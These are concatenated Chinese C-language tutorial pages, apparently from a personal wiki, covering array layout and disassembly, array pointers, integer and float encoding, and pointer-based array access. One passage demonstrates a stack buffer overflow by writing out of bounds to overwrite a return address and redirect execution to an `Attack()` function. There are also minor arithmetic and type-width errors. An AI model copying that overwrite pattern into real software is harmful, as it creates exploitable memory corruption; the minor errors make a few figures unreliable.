age[10]=&#123;1,2,3,4,5,6,7,8,9,10&#125; return 0;&#125; 编译器为数组分配的大小 如果定义char/short/int类型的数组，ESP会减少多少？为什么？ char x[10]short age[10]1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; char x[10]; return 0;&#125; 4Ch-40h=Ch，12个字节。我们声明的是10个char类型，为什么分配了12个字节？ 这涉及本机尺寸的概念，在32位机器下，对4字节的支持最好。10不是4的倍数，所以多分配了2字节，凑成12字节，这是一种以空间换时间的做法，在运行效率和内存分配之间做的取舍。1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; short x[10]; return 0;&#125; 54h-40h=14h=20D，20个字节。声明了10个short类型，10×2=20字节，刚好是4字节的倍数。 其实也很好理解，如果还是像参数和局部变量那样，每个char和short类型的变量都给4字节，当1个数组非常大时，空间浪费就很大。所以数组下的char和short类型并没有像参数和局部变量那样每个分配4字节。 结论：根据声明的总大小，按4字节的倍数进行分配。 数组的访问 无论多么复杂的表达式，在我们眼中就是一个值。下面形式对数组的访问都是可以的： 123456789101112131415161718192021222324252627282930#include &quot;stdafx.h&quot;int Add(int x,int y)&#123; return x+y;&#125;void Function() &#123; int arr[10] = &#123;1,2,3,4,5,6,7,8,9,10&#125;; int x = 1; int y = 2; int r ; r = arr[1]; r = arr[x]; r = arr[x+y]; r = arr[x*2+y]; r = arr[arr[1]+arr[2]]; r = arr[Add(1,2)]; &#125; int main(int argc, char *argv[])&#123; Function(); return 0;&#125; 练习：找出上面代码中对变量r赋值过程的反汇编代码。目的：弄清数组在内存中的寻址方式 答案1234567891011121314151617181920212223242526Function:0040DE60 55 push ebp0040DE61 8B EC mov ebp,esp0040DE63 83 EC 74 sub esp,74h0040DE66 53 push ebx0040DE67 56 push esi0040DE68 57 push edi0040DE69 8D 7D 8C lea edi,[ebp-74h]0040DE6C B9 1D 00 00 00 mov ecx,1Dh0040DE71 B8 CC CC CC CC mov eax,0CCCCCCCCh0040DE76 F3 AB rep stos dword ptr [edi]; int arr[10] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;\t0040DE78 C7 45 D8 01 00 00 00 mov dword ptr [ebp-28h],1 ;arr[0]0040DE7F C7 45 DC 02 00 00 00 mov dword ptr [ebp-24h],2 ;arr[1]0040DE86 C7 45 E0 03 00 00 00 mov dword ptr [ebp-20h],3 ;arr[2]0040DE8D C7 45 E4 04 00 00 00 mov dword ptr [ebp-1Ch],4 ;arr[3]0040DE94 C7 45 E8 05 00 00 00 mov dword ptr [ebp-18h],5 ;arr[4]0040DE9B C7 45 EC 06 00 00 00 mov dword ptr [ebp-14h],6 ;arr[5]0040DEA2 C7 45 F0 07 00 00 00 mov dword ptr [ebp-10h],7 ;arr[6]0040DEA9 C7 45 F4 08 00 00 00 mov dword ptr [ebp-0Ch],8 ;arr[7]0040DEB0 C7 45 F8 09 00 00 00 mov dword ptr [ebp-8],9 ;arr[8]0040DEB7 C7 45 FC 0A 00 00 00 mov dword ptr [ebp-4],0Ah ;arr[9]; int x=1; 0040DEBE C7 45 D4 01 00 00 00 mov dword ptr [ebp-2Ch],1; int y=2;0040DEC5 C7 45 D0 02 00 00 00 mov dword ptr [ebp-30h],212345; int r;; r=arr[1];0040DECC 8B 45 DC mov eax,dword ptr [ebp-24h]0040DECF 89 45 CC mov dword ptr [ebp-34h],eaxecx=1，[ebp+ecx*4-28h]=[ebp+0xC-28h]=[ebp+0xC-28h]=[ebp-28h]=1int类型，所以是×4。如果是short类型，×2。如果是char类型，×1。1234; r=arr[x];0040DED2 8B 4D D4 mov ecx,dword ptr [ebp-2Ch]0040DED5 8B 54 8D D8 mov edx,dword ptr [ebp+ecx*4-28h]0040DED9 89 55 CC mov dword ptr [ebp-34h],edx12345; r=arr[x+y];0040DEDC 8B 45 D4 mov eax,dword ptr [ebp-2Ch]0040DEDF 03 45 D0 add eax,dword ptr [ebp-30h]0040DEE2 8B 4C 85 D8 mov ecx,dword ptr [ebp+eax*4-28h]0040DEE6 89 4D CC mov dword ptr [ebp-34h],ecx123456; r=arr[2*x+y];0040DEE9 8B 55 D4 mov edx,dword ptr [ebp-2Ch]0040DEEC 8B 45 D0 mov eax,dword ptr [ebp-30h]0040DEEF 8D 0C 50 lea ecx,[eax+edx*2]0040DEF2 8B 54 8D D8 mov edx,dword ptr [ebp+ecx*4-28h]0040DEF6 89 55 CC mov dword ptr [ebp-34h],edx12345; r=arr[arr[1]+arr[2]]; 0040DEF9 8B 45 DC mov eax,dword ptr [ebp-24h]0040DEFC 03 45 E0 add eax,dword ptr [ebp-20h]0040DEFF 8B 4C 85 D8 mov ecx,dword ptr [ebp+eax*4-28h]0040DF03 89 4D CC mov dword ptr [ebp-34h],ecx1234567;; r=arr[Add(1,2)]; 0040DF06 6A 02 push 20040DF08 6A 01 push 10040DF0A E8 19 31 FF FF call @ILT+35(func) (00401028)0040DF0F 83 C4 08 add esp,80040DF12 8B 54 85 D8 mov edx,dword ptr [ebp+eax*4-28h]0040DF16 89 55 CC mov dword ptr [ebp-34h],edx 数组边界 编译器不会检查数组边界。编译不会有错，但读取的数据不可控。 缓冲区溢出 下面代码的Attack()为什么会被调用？ 123456789101112131415161718192021#include &quot;stdafx.h&quot;void Attack() &#123; printf(&quot;Attack!&quot;); getchar(); &#125; void Fun() &#123; int arr[5] = &#123;1,2,3,4,5&#125;; arr[6] = (int)Attack; &#125; int main(int argc, char *argv[])&#123; Fun(); return 0;&#125; 答案下面这行代码的解释：函数名和变量名都是内存地址的别名。下面这行就是将Attack函数的地址转为int类型后赋值给变量arr[6]。1arr[6] = (int)Attack;\t数组正常边界是arr[0]-arr[4]，用arr[6]修改了[ebp+4]（返回地址）。所以，Fun结束调用返回时，返回到了Attack函数。"},{"title":"数组指针","path":"/wiki/C/数组指针.html","content":"引 之前学的&amp;取地址符，可用在变量上对变量取地址 1234int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;;int* p = &amp;arr[0]; //取arr数组第一个成员的地址int* p1 = arr; //上面的简写形式 那&amp;arr是什么？我们用一个int类型变量作为左值，编译来看一下 1int x = &amp;arr; //arr也是一个变量，用&amp;取，是什么类型？ 报错说：无法将int (*)[10]类型转为int类型。说明&amp;arr是int (*)[10]类型。实际上这是数组指针类型。 数组指针：指针，数据类型为数组的指针，指向数组的指针。既然是指针，就满足我们之前学的指针的那些特征 声明和赋值 声明 (*x)可以挨着int写，也可以挨着[]写 123int(*px) [5];int (*px)[5]; 1234567891011//一维数组指针char(*p1) [3]; //指针变量名为p1，类型为char(*) [3]int(*p2) [5]; //指针变量名为p2，类型为int(*) [5]//二维数组指针char(*p3) [2][2]; //指针变量名为p3，类型为char(*) [2][2]int(*p4) [2][2]; //指针变量名为p4，类型为int(*) [2][2]//三维数组指针char(*p5) [3][3][3]; //指针变量名为p5，类型为char(*) [3][3][3]int(*p6) [3][3][3]; //指针变量名为p6，类型为int(*) [3][3][3] int *p[5]与int (*p)[5]有什么区别？int *p[5]：指针数组[]的优先级高于*，所以先和p组合成p[5]数组，再由int *说明数组的成员的数据类型，这种写法可能清晰些：int* p[5]int (*p)[5]：数组指针()的优先级高于[]，所以*先和p结合成指针，再由int[5]说明指针的类型是指向一个连续包含5个int的内存区域（即数组） 赋值 要保证类型一致，完整写法。 1234 int(*p2) [5]; //指针类型为int(*) [5] p2=(int(*) [5])1; //对1强转为int(*) [5]类型然后赋给p2 //p2=(int* [5])1; //别写错了 特征探测 宽度 指针类型变量的宽度永远是4字节，无论是什么类型的指针。用sizeof探测数组指针的宽度，输出结果为4，和之前学的一样。 运算 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &quot;stdafx.h&quot;int main()&#123; //一维数组指针 char(*p1) [3]; int(*p2) [5]; //二维数组指针 char(*p3) [2][2]; int(*p4) [2][2]; //三维数组指针 char(*p5) [3][3][3]; int(*p6) [3][3][3]; //给这些指针都赋值为1 p1=(char(*) [3])1; p2=(int(*) [5])1; p3=(char(*) [2][2])1; p4=(int(*) [2][2])1; p5=(char(*) [3][3][3])1; p6=(int(*) [3][3][3])1; //都++，然后打印输出观察+了多少 p1++; p2++; p3++; p4++; p5++; p6++; // 打印一维数组指针++后的结果 printf(&quot;%d %d &quot;, p1, p2); // 打印二维数组指针++后的结果 printf(&quot;%d %d &quot;, p3, p4); // 打印三维数组指针++后的结果 printf(&quot;%d %d &quot;, p5, p6); return 0;&#125; 按之前学的，指针++，增加的数量是去掉一个*后变量的宽度 一维数组指针二维数组指针三维数组指针对于指针p1，指针类型是(char* [3])，去掉一个*后是char [3]（char类型，3个），宽度是sizeof(char)×3=3，增加3。1+3=4； 对于指针p2，指针类型是(int* [5])，去掉一个*后是int [5]（int类型，5个），宽度是sizeof(int)×5=20，增加20。1+20=21。对于指针p3，指针类型是(char* [2][2])，去掉一个*后是char [2][2]（char类型，2×2个），宽度是sizeof(char)×2×2=4，增加4。1+4=5； 对于指针p4，指针类型是(int* [2][2])，去掉一个*后是int [2][2])（int类型，2×2个），宽度是sizeof(int)×2×2==16，增加16。1+16=17。对于指针p5，指针类型是(char* [3][3][3])，去掉一个*后是char [3][3][3]（char类型，3×3×3个），宽度是sizeof(char)×3×3×3=27，增加27。1+27=28； 对于指针p6，指针类型是(int* [3][3][3])，去掉一个*后是int [3][3][3]（int类型，3×3×3个），宽度是sizeof(int)×3×3×3=20，增加108。1+108=109。 ++，–，+N，-N，同理，这里略 使用数组指针 12int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;;int(*px)[10] = &amp;arr; *px是什么？按之前学的，（*+指针类型表达式）的类型，是变量当前的类型减去一个*号。int(*) [10]数组指针类型去掉一个*后是int [10]，那么*px就是一个数组。然后我们取这个数组中的第一个成员，就是这样写(*px)[0]。 1printf(&quot;%d &quot;, (*px)[0]); 此外，按前边学的指针取值的两种方式，*(p+i) = p[i]。于是还有下面两种写法： 123//将(*px)[0]中的(*px)替换为等价写法，(*px)=*(px+0)=px[0]//(*px)[0]就变成了px[0][0]printf(&quot;%d &quot;, px[0][0]); 12345678910// 将(*px)[0]中的(*px)这一个整体看成px，代入(*px)=*(px+0)=px[0]// 令y=(*px)// 那么(*px)[0]=y[0]=*(y+0)// 恢复y//*((*px)+0)// 根据(*px)=*(px+0)，写全//*(*(px+0)+0)// 综上，(*px)[0]就变成了*(*(px+0)+0)printf(&quot;%d &quot;, *(*(px + 0) + 0)); 关于px和*px123456789101112#include &quot;stdafx.h&quot;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; int(*px)[10] = &amp;arr; printf(&quot;%d %d &quot;, px, *px); printf(&quot;%d %d &quot;, px + 1, (*px) + 1); return 0;&#125;px是int (*)[10]类型，*px是int [10]数组类型虽然它俩存的值一样，但在运算时，比如++，–，+N，-N是根据它的类型进行的比如，上面的代码px+1，是+1×4×10(*px)+1，是+1×4 为了方便测试，我们创建一个二维数组接着试。但在实际情况中，数组指针可以指向任何地方，不一定要指向数组，它们之间没有任何联系。 12345678910int arr[3][3] = &#123; &#123;1,2,3&#125;, &#123;4,5,6&#125;, &#123;7,8,9&#125;&#125;;//第一个成员是arr[0]，arr[0]是&#123;1,2,3&#125;一个一维数组//取它的地址，&amp;arr[0]，在原来的类型上加一个*，表达式类型是一维数组指针int(*px)[3] = &amp;arr[0]; *px得到的是什么？将int(*) [3]砍去一个*后，就是一个一维数组，宽度为3。(*px)[0]，就是取这个数组中的第一个成员，取出来的是1。 12345678//打印会输出 1 3printf(&quot;%d %d &quot;, (*px)[0], (*px)[2]);px++; //++，将(int* [3])砍去一个*，剩下int [3]，宽度是12 //于是++后,跳过了12字节，指向了下一行数组&#123;4, 5, 6&#125;//打印会输出 4 6printf(&quot;%d %d &quot;, (*px)[0], (*px)[2]); 更多例子 12345678910111213char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;; 一维数组指针二维数组指针三维数组指针char型int型1234char(*p)[5];p = (char(*)[5])code;printf(&quot;%x &quot;, *(*(p + 4) + 3)); //取出来的值是多少？ 数字 表达式 具体数字 4 4×char[5] 4×5=20 3 3×sizeof(char) 3×1=3 总和23 取char个字节 1234567char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, //0-9 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, //10-19 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, //20-29，23就是0x47 //...&#125;; *(*(px + 0) + 0)就是数组第一个0x00，第1个就是数组下标为1，跳过23字节，就是下标为23。 最终结果：0x471234int(*p)[5];p = (int(*)[5])code;printf(&quot;%x &quot;, *(*(p + 2) + 2)); // 取出来的值是多少？ 数字 表达式 具体数字 2 2×int[5] 2×20=40 2 2×sizeof(int) 2×4=8 总和48 上面每个数字都要×sizeof(int)，先加一起最后×4也行。即： 2×5+2 （2×5+2）×4=48 12345678910111213char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 40-49 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, // 50-59 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 &#125;; 取int个字节，就是取了char[48]，char[49]，char[50]，char[51]，0x00,0x00,0x00,0x00。因为小端序，所以最终结果：0x00000000char型int型1234char(*p)[2][3];p = (char(*)[2][3])code;printf(&quot;%x &quot;, *(*(*(p + 2) + 3) + 4)); // 取出来的值是多少？ 从一维数组指针取值要两个*号，那么从二维数组指针中取值要再多一个*号 数字 表达式 具体数字 2 2×char[2][3] 2×6=12 3 3×char[3] 3×3=9 4 4×sizeof(char) 4×1=4 总和25 取char个字节 1234567char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, // 10-19 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, // 20-29 //... &#125;; 最终结果：0x0E1234int(*p)[2][3];p = (int(*)[2][3])code;printf(&quot;%x &quot;, *(*(*(p + 2) + 2) + 2)); // 取出来的值是多少？ 数字 表达式 具体数字 2 2×int[2][3] 2×24=48 2 2×int[3] 2×12=24 2 2×sizeof(int) 2×4=8 总和80 取int个字节，就是取char[80]-char[83]共四个字节的数，0x00,0x00,0x00,0x64 12345678910111213char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, //70-79 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, //80-89 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;; 注意小端序。最终结果：64000000char型int型1234char(*p)[2][3][2];p = (char(*)[2][3][2])code;printf(&quot;%x &quot;, *(*(*(*(p + 2) + 2) + 2) + 2)); // 取出来的值是多少？ 数字 表达式 具体数字 2 2×char[2][3][2] 2×12=24 2 2×char[3][2] 2×6=12 2 2×char[2] 2×2=4 2 2×sizeof(char) 2×1=2 总和42 取char个字节 123456789char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 40-49 //... &#125;; 最终结果：0x64略 二维数组指针可以访问一维数组吗？ 1234567int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;;//想把arr赋给px，类型要一样//int(*px)[2][2] = arr; //编译报错//要强转为int(*)[2][2]类型int(*px)[2][2] =(int(*)[2][2])arr; //ok px现在是arr数组的首地址。那*px是什么东西？*px取出来的东西就是原来的类型砍去一个*，(int(*)[2][2])类型去掉一个*后是(int[2][2])，一个二维数组。那么，在我们眼中，*px就是int[2][2]的数组。 12345678910//1组两个，第0个，第1个//第0组：1, 2//第1组：3, 4//第2组：5, 6//第3组：7, 8//第4组：9, 10(*px)[1][1]; //取第1组的第1个，取出来是4//另一种想法//int[2][2]也就是等于int[4]，所以&#123;1,2,3,4&#125;给了int[2][2]，也就是&#123;&#123;1,2&#125;, &#123;3,4&#125;&#125; 123px++; //++，加sizeof(int)×2×2=16 //++后，指向&#123;&#123;5,6&#125;,&#123;7,8&#125;&#125;printf(&quot;%d &quot;, (*px)[1][1]); //再取就是8 练习 *()与[]是可以互换的，也就是说，*(*(p+1)+2)相当于p[1][2]，那么，*(p+1)[2]是否一定等于p[1][2]？通过反汇编进行论证。 答案反汇编看一下咯123456789101112131415#include &quot;stdafx.h&quot;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; int(*p)[2] = (int(*)[2])arr; printf(&quot;%d &quot;, p[1][2]); printf(&quot;%d &quot;, *(*(p + 1) + 2)); printf(&quot;%d &quot;, *(p + 1)[2]); return 0;&#125;反汇编中看到一步到位就取数了，那我们拿运行后的结果和现有理论看是否匹配。12p[1][2]*(*(p + 1) + 2)第一个数，跳过1个int[2]，指向3；第二个数，跳过2个int，指向5。嗯，合理。但*(p + 1)[2]怎么输出是7？难道不能随意用*(p+i) = p[i]替换？再看如下两个表达式，有什么区别？12printf(&quot;%d &quot;, *(p + 1)[2]); printf(&quot;%d &quot;, (*(p + 1))[2]); 看出来了吗？这其实不是等价变化的问题，而是优先级的问题。*(p + 1)[2]，()小括号优先级最高，先p+1，后移1个int[2]，指向了3。用符号px作为p+1的结果，现在变成*px[2]，[]优先级比*号高，px往后走2个int[2]，来到了7。用符号py作为px[2]的结果，现在变成*py，取值，取出来是7。(*(p + 1))[2]，多了一个括号，保证p+1算完后，先与*结合。用px作为*(p+1)，px[2]，p+1算完指向3，加*，现在是数组类型，取数组中第2个元素，所以往后走2个int，取出来5。 不将表达式做变化，下面这个表达式取出来是多少，怎么算的 1234567891011#include &quot;stdafx.h&quot;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; int(*px)[2] = (int(*)[2])arr; printf(&quot;%d &quot;, *(*(px + 1) + 1)); return 0;&#125; 答案px+1，指针类型做运算，看去掉一个*后的类型的宽度；px是int(*)[2]类型，去掉一个*后是int [2]类型，宽度是sizeof(int)×2=8，增加8。于是从arr数组开始往后移8个字节，现在指向3;*(px + 1)，*(px + 1)是数组类型，int [2];*(px + 1)+1，数组类型，+1，就是在数组中移动元素个数，+1，移动1个int。于是往后移1个元素，指向4;（也可以把数组当成指针，然后套指针类型做运算砍*的方法）*(*(px + 1) + 1)，加*号，取出这个元素。综上，第一个数字1，跳过1×int [2]，第二个数字1，在数组中往后查1个个数（也可以说是移动1个int）。 以下说法是否正确： 1234指针的指针：就是指向指针的指针结构指针：就是指向结构的指针数组指针：就是指向数组的指针函数指针：就是指向函数的指针 答案指针的类型与它指向的数据的类型无关。以结构体指针为例，结构体指针不一定要指向结构体，爱指哪指哪。"},{"title":"整数类型和浮点类型","path":"/wiki/C/整数类型和浮点类型.html","content":"数据类型 C语言中的数据类型可分为：基本类型（整数类型，浮点类型）、构造类型（数组类型，结构体类型，共用体联合类型）、指针类型、空类型（void）。 本节我们讲解基本类型。 如何学习数据类型 从三个方面对数据类型进行学习： 存储数据的宽度 存储数据的格式 存储在计算机中同一个数，不同的解释，得到的值不一样。 作用范围（作用域） 整数类型 宽度 变量类型 位数 数据宽度 数据范围 char 8bit 1字节 0-0xFF short 16bit 2字节 0-0xFFFF int 32bit 4字节 0-0xFFFFFFFF long 32bit 4字节 0-0xFFFFFFFF 在16位计算机中，int和short宽度一样，都是16位； 在32位计算机中，int和long宽度一样，都是32位。 在数据溢出时舍弃高位，保留低位 12char x=0xFF //1111 1111char y=0x110 //0001 0001 0000 存储格式 原码，反码，补码，参考数据的运算和表示-数的表示。 有符号和无符号 signed、unsigned 在内存中的存储完全一样。 有符号数和无符号数在以下常见会有区别（海哥的总结）： 拓展（高位补0还是补1） 比较（同一个数，解释为正数或负数，大小是不一样的） 还是那句话，取决于程序员对待这个数据的视角，落在编程上，就是变量类型声明，和怎么去使用这个变量。 浮点数类型 宽度 变量类型 位数 数据宽度 float 32bit 4字节 double 32bit 8字节 long double 32bit 8字节（某些平台的编译器可能是16个字节） 建议的赋值方式： 123float a = 1.23F;double b = 2.34;long double c = 2.34L; 如果不加上F，编译器默认会认为这个值是double，然后再转换赋值给float。 存储格式 遵守IEEE编码标准。 以float类型为例，将一个浮点数转化为内存存储格式的步骤为： 将这个实数的绝对值转换为二进制格式（辗转相除法） 整数部分，不断除以2，直到结果为0。结果从下往上读。 小数部分，不断乘以2；如果结果大于1.0则二进制位为1，否则为0；直到结果的小数点为0或进入循环。结果从上往下读。 将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有效数字的右边。 从小数点右边第一位开始取出二十三位数字放入第22到第0位。 有的小数转换为二进制部分是个循环。IEEE标准下尾数就是23位。 有的小数转换为二进制部分不会循环，不够23个，后面就补0。 填充符号位（第31位）。 如果实数是正的，则放入“0” 如果实数是负的，则放入“1”。 指数部分 如果n是左移得到的，说明指数是正的。那么第30位放入“1”，其余待定为0，指数部分此时变成10000000。随后将n减去1，转换为二进制，放入第29到第23位（7个零，0000000）（第30位不动）。 如果n是右移得到的或n=0，则第30位放入“0”，其余待定为0，指数部分此时变成00000000。 随后将n减去1，转换为二进制，放入第29到第23位（7个零，0000000）（第30位不动）。 或 将n转换为二进制后在左边加“0”补足7位，再各位求反，放入第29位到23位。 传统计算方式这里是n+偏置值127（其实就是移码），然后转二进制，放入指数部分。 海哥这里对指数部分处理进行了优化： 对于n为正的情况：10000000，相当于+了128，加多了个1。然后n-1，转二进制，放入指数部分后7位。 对于n为负的情况： 假设n=-3 传统算法：127+(-3)=124，转换成二进制数01111100 海哥的算法：00000000，-3-1=-4，FC，1111 1100，放入（相当于+10000000，即+128，进位丢失；或叫舍掉最高位），得到0 111 1100 在本来负数最高位为1的情况下，10000000变成00000000，相当于+正数128，加多了个1。然后n-1，转二进制，放入指数部分后7位。 例1-1 8.25转成浮点存储 步骤一 将实数部分转换为二进制格式 从下往上读，由此可以得出8的二进制为1000 所有的整数一定可以完整的转换为二进制。 从上往下读，小数部分0.25不断的乘以2，直到结果小数点为0。 用二进制描述小数，不可能做到完全精确。比如将0.4转换成二进制，不断×2会进入循环，永远无法得到结果小数点为0的情况。 得到8.25的二进制表示形式 1000.01 步骤二 二进制的科学计数法 1000.01-&gt;1.00001×2的3次方，n=3 步骤三 填充尾部部分 符号位 指数部分 尾数部分 00001000000000000000000 步骤四 填充符号位 8.25是正数，符号位为0 符号位 指数部分 尾数部分 0 00001000000000000000000 步骤五 处理指数部分 n是左移得到的，第30位放入“1”，其余补0，指数部分此时变成10000000。 符号位 指数部分 尾数部分 0 10000000 00001000000000000000000 将n减去1，转换为二进制，放入第29到第23位（7个零，0000000） 3-1=2，二进制数是10。放入指数部分第29到第23位，得到 符号位 指数部分 尾数部分 0 10000010 00001000000000000000000 0100 0001 0000 0100 0000 0000 0000 0000 十六进制就是：41040000h 例1-2 -8.25转成浮点存储 观察计算过程，只有符号位变了，其他一样，所以是 符号位 指数部分 尾数部分 1 10000010 00001000000000000000000 1100 0001 0000 0100 0000 0000 0000 0000 十六进制就是：0xC1040000h 例2 0.25转成浮点存储 步骤一 将实数部分转换为二进制格式 步骤二 二进制的科学计数法 0.01-&gt;1.0×2的-2次方，n=-2 步骤三 填充尾部部分 符号位 指数部分 尾数部分 00000000000000000000000 步骤四 填充符号位 0.25是正数，符号位为0 符号位 指数部分 尾数部分 0 00000000000000000000000 步骤五 处理指数部分 n是右移得到的，第30位放入“0”，其余补0，指数部分此时变成00000000。 符号位 指数部分 尾数部分 0 00000000 00000000000000000000000 将n减去1，转换为二进制，放入第29到第23位（7个零，0000000） -2-1=-3，二进制数是FD，1111 1101放入指数部分，得到01111101 1111 1101 注意放入的是第29到第23位，第30位不动，所以00000000-&gt;01111101 而不是00000000-&gt;11111101 符号位 指数部分 尾数部分 0 01111101 00000000000000000000000 00111110100000000000000000000000 十六进制就是：3E800000h double类型的IEEE编码 和float一样，只是范围更大。1+11+52。用传统计算方法所以偏置值是1023。但海哥的计算方法不会变。 浮点类型的精度 待考究 float和double的精度是由尾数的位数来决定的； 比如，8.25 1000.01-&gt;1.00001×2的3次方，存入23位的尾数时既存入了整数部分，也存入了小数部分。所以看到这类说法都是错的：float类型能精确到小数点后几位。 float : 2^23 = 8388608 一共7位，这意味着最多能有7位有效数字（整数+小数一共7位；而不是小数点后7位）； double : 2^52 = 4503599627370496 一共16位，这意味着最多能有16位有效数字。 练习 将float类型的12.5转换成16进制 答案步骤一 将实数部分转换为二进制格式12345 商 余12/2=6 06/2 =3 03/2 =1 11/2=0 110.5*2=1.0 11100.1步骤二 二进制的科学计数法1100.1-&gt;1.1001×2的3次方，n=3步骤三 填充尾部部分符号位指数部分尾数部分10010000000000000000000步骤四 填充符号位12.5是正数，符号位为0符号位指数部分尾数部分010010000000000000000000步骤五 处理指数部分n是左移得到的，第30位放入“1”，其余补0，指数部分此时变成10000000。符号位指数部分尾数部分01000000010010000000000000000000将n减去1，转换为二进制，放入第29到第23位（7个零，0000000）3-1=2，二进制数是10。放入指数部分第29到第23位，得到符号位指数部分尾数部分0100000101001000000000000000000001000001010010000000000000000000十六进制就是：41480000h"},{"title":"用指针操作数组","path":"/wiki/C/用指针操作数组.html","content":"用指针操作数组 假设有这么一个数组： 1char arr[5] = &#123;1, 2, 3, 4, 5&#125;; arr[0]表示数组中第一个元素，它是个变量； arr[1]表示数组中第二个元素，它是个变量； arr[2]表示数组中第三个元素，它是个变量； arr[3]表示数组中第四个元素，它是个变量； arr[4]表示数组中第五个元素，它是个变量。 前面，学过，&amp;可以用来取变量的地址，那么给变量arr[0]加上&amp;是可行的，于是： &amp;arr[0]表示数组中第一个元素的地址； &amp;arr[1]表示数组中第二个元素的地址； &amp;arr[2]表示数组中第三个元素的地址； &amp;arr[3]表示数组中第四个元素的地址； &amp;arr[4]表示数组中第五个元素的地址。 &amp;arr[i]后是地址，它是个常量，类型是char*，要用一个char*类型的容器（变量）来存这个数。 此外，arr也表示数组第一个元素的地址。 1234char *p;p = &amp;arr[0]; //写法一p = arr; //写法二 那么我们可以用指针来操作数组，如下代码： 12345// 数组写法for (int i = 0; i &lt; 5; i++)&#123; printf(&quot;%d &quot;, arr[i]);&#125; 12345678char *p;p = arr;// 指针写法for (int i = 0; i &lt; 5; i++)&#123; printf(&quot;%d &quot;, *(p + i)); //p+i加括号，为了可读性&#125; 小结 &amp;arr[0]表示取数组中第一个元素的地址，可以省略为数组名arr *(p+i) = p[i] 数组作为函数参数 